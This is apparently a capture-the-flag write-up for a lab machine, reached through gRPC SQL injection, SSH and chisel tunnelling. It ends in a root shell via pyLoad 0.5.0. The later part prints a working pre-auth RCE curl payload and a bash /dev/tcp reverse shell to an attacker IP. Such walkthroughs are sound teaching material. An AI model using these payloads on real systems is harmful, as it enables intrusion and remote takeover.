## Enumeration

### NMAP

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

### Scan All ports

    nmap -Pn -p- 10.10.11.214 -oA nmap/all-ports -vv
    
    Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-01 14:31 +0545
    Initiating Parallel DNS resolution of 1 host. at 14:31
    Completed Parallel DNS resolution of 1 host. at 14:31, 0.00s elapsed
    Initiating Connect Scan at 14:31
    Scanning 10.10.11.214 [65535 ports]
    Discovered open port 22/tcp on 10.10.11.214
    Discovered open port 50051/tcp on 10.10.11.214
    Completed Connect Scan at 14:36, 247.76s elapsed (65535 total ports)
    Nmap scan report for 10.10.11.214
    Host is up, received user-set (0.29s latency).
    Scanned at 2023-08-01 14:31:53 +0545 for 248s
    Not shown: 65533 filtered tcp ports (no-response)
    PORT      STATE SERVICE REASON
    22/tcp    open  ssh     syn-ack
    50051/tcp open  unknown syn-ack

Two ports 22 and 50051 are open which are for SSH and unknown. We need to enumerate the services on port 50051.

### Service Scan

    cat nmap/all-ports.nmap | awk '$2 == "open" { sub("/.*","",$1); print $1 }' | sed -z 's/\n/,/g;s/,$/\n/'  
    22,50051
    
    nmap -sC -sV -p22,50051 -oA nmap/10.10.11.214 10.10.11.214 -vv -Pn                         
    
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

### Port — 50051

On searching for port 50051, it is generally used for gRPC (go) server.

![](https://cdn-images-1.medium.com/max/2586/1*i01bGiG-yaNAR8lez1LvPQ.png)

I searched further to identify if it contains any security issues and found one good blog which explains the security vulnerabilities on gRPC server which mostly talks about injection based attacks.

![](https://cdn-images-1.medium.com/max/2504/1*1nGNhOeQ7eOxkA2ln2eT2w.png)

[**gRPC Security Series: Part 3**
*Security Vulnerabilities in gRPC*medium.com](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9)

Let’s first enumerate the server with grpcurl.

    go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

We can see that there is an application installed on the server named as SimpleApp.

    grpcurl -plaintext 10.10.11.214:50051 list     
    SimpleApp
    grpc.reflection.v1alpha.ServerReflection

Now lets enumerate the properties on the application with it.

    grpc grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
    SimpleApp.LoginUser
    SimpleApp.RegisterUser
    SimpleApp.getInfo

![](https://cdn-images-1.medium.com/max/2000/1*eet32g9i1NrdI1JBBixv4w.png)

We can see that we have three properties for login, registration and user information. With a tool called grpcui, we can access the application through our local host.

    go install github.com/fullstorydev/grpcui/cmd/grpcui@latest

Use grpcui tool and provide the host and port of the server.

    grpcui -plaintext 10.10.11.214:50051

![](https://cdn-images-1.medium.com/max/2000/1*P706tU5GBjN7udCK8dS5aA.png)

Now as mentioned above on the screenshot we can see the application is hosted on our local host and it will forward the traffic to the server.

Let’s first register the user.

![](https://cdn-images-1.medium.com/max/2000/1*U-h37KkwNnvCw718ayVk1Q.png)

Account has been created successfully.

![](https://cdn-images-1.medium.com/max/2000/1*WAxOdKJjdTy0mguGkB4vPw.png)

Login into the application.

![](https://cdn-images-1.medium.com/max/2000/1*yfBqnToMDiu25Zf1eWP7ZA.png)

Copy the session token.

![](https://cdn-images-1.medium.com/max/2000/1*ZUBGWDgW-7EPApldcyXDGA.png)

Place the token on the request headers.

![](https://cdn-images-1.medium.com/max/2000/1*Oi0TuJjcJEibbbOtRs-G0g.png)

Now using a method getinfo, invoke the request and intercept the request on burp.

![](https://cdn-images-1.medium.com/max/2822/1*5qfVKx1hQ8jyFPlR116bfA.png)

![](https://cdn-images-1.medium.com/max/2000/1*A6Lr9J2FbhSCsoQ9GFtM3g.png)

Save the request to a file.

![](https://cdn-images-1.medium.com/max/2000/1*30v58Jg51y2FE2rHJOsGOg.png)

Run SQLMap.

![](https://cdn-images-1.medium.com/max/2720/1*RdinW9XSaUhAhfXLrdUU8Q.png)

Database name SQLite has been enumerated. Now let’s dump all the entries on the databases with — dump flag.

![](https://cdn-images-1.medium.com/max/2174/1*b7xIM9QtMWsDISIR9wTrvQ.png)

We can see that we have gained some credentials for admin and sau.

![](https://cdn-images-1.medium.com/max/2000/1*rBIETkFfwrym0aPY1pjqwg.png)

Use the credentials for user sau to access the SSH service. We have successfully logged in into the box with a privileges of sau user. Read the user.txt file from /home/sau/ directory and we can get the user flag.

![](https://cdn-images-1.medium.com/max/2000/1*8S1bvx2hwEravb8oDkVSaQ.png)

## Privilege Escalation

Download and run linepeas into the box.

![](https://cdn-images-1.medium.com/max/2000/1*uVVWaIVyrusS3iazUSfYpw.png)

We can see that the box is listening to port 8080 but it is only accessible through the localhost.

![](https://cdn-images-1.medium.com/max/2000/1*yj3MWr6n472Yv-Fthgp-nQ.png)

We can also confirm that with **ss -tulnp** command.

![](https://cdn-images-1.medium.com/max/2000/1*Hkd3xMeKz11wFJeUmgLgLg.png)

Download the tool called chisel into the box. It is generally used for port forwarding.
[GitHub - jpillora/chisel: A fast TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

![](https://cdn-images-1.medium.com/max/2000/1*tGi-m7WGRVCaQ4BlSxtUfg.png)

Forward the port 8080 from the box using chisel.

In an attacker machine.

    chisel server --reverse --port 9999

In the box.

    chisel client attacker-ip:9999 R:8000:127.0.0.1:8000

![](https://cdn-images-1.medium.com/max/2000/1*zhRiKQ7btLvteBsXv5WgeQ.png)

Now we can access the internally hosted port 8080 from an attacker machine.

![](https://cdn-images-1.medium.com/max/2000/1*3vG_kYCum07l7CZYgAEXoA.png)

The server hosts the application as pyLoad. Let’s see if we can have any exploit available for it.

![](https://cdn-images-1.medium.com/max/2018/1*tmaZLjfMAM6eB6drKr70Kw.png)

PyLoad 0.5.0 has a vulnerability that allows Pre-auth Remote Code Execution. Unfortunately, I forgot to capture a screenshot of the version number. However, you can retrieve the pyLoad version directly from the box by utilizing the ‘pyload — version’ option, which will display the version as 0.5.0.”

Additionally, I forgot to capture another screenshot of the running process, which would reveal that pyload is operating with root privileges. This means that if we manage to exploit this application and gain Remote Code Execution (RCE), we would have the ability to execute commands as the root user.

Upon searching for the exploit, I found this good resource which explains the vulnerability and exploit very well.

![](https://cdn-images-1.medium.com/max/2688/1*wWpKBxllsDsfZVM9s82sNw.png)

[Pre-auth RCE in pyload](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)

Copy the payload. Here the content of the jk parameter is the command that we want to execute in the server.

    curl -i -s -k -X $'POST' \
        -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
        --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
        $'http://127.0.0.1:8000/flash/addcrypted2'

On decoding, I found the payload simply creates a text file inside /tmp/ directory.

![](https://cdn-images-1.medium.com/max/2076/1*nZN0JUfvz2c0cZh9EqsCgA.png)

What we need is reverse shell, so let’s create a bash file inside the box which performs reverse connection to our attacker machine.

    bash -i >& /dev/tcp/10.10.14.100/9001 0>&1

![](https://cdn-images-1.medium.com/max/2000/1*AnJyaQ7xAdWmdeTSpeQfkg.png)

Modify the value in jk paramter and execute the above mentioned bash file.

    curl -i -s -k -X $'POST' \
        --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/reverse.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
        $'http://127.0.0.1:8000/flash/addcrypted2'

The command within the ‘jk’ parameter mentioned above is just the URL encoded data of the payload, responsible for executing the ‘reverse.sh’ file located in the ‘/tmp/’ directory.

![](https://cdn-images-1.medium.com/max/2004/1*Aw8N2uggYX8us6kAIqUMxA.png)

Setup a netcat listener into your machine and execute the above payload in the box.

![](https://cdn-images-1.medium.com/max/2000/1*lnS4hQQij7HG8ER6m4BF5g.png)

We can have the reverse shell as a root user.

![](https://cdn-images-1.medium.com/max/2000/1*XMHwgWuGB6DolUKSU_ufuQ.png)

Happy Hacking !!!
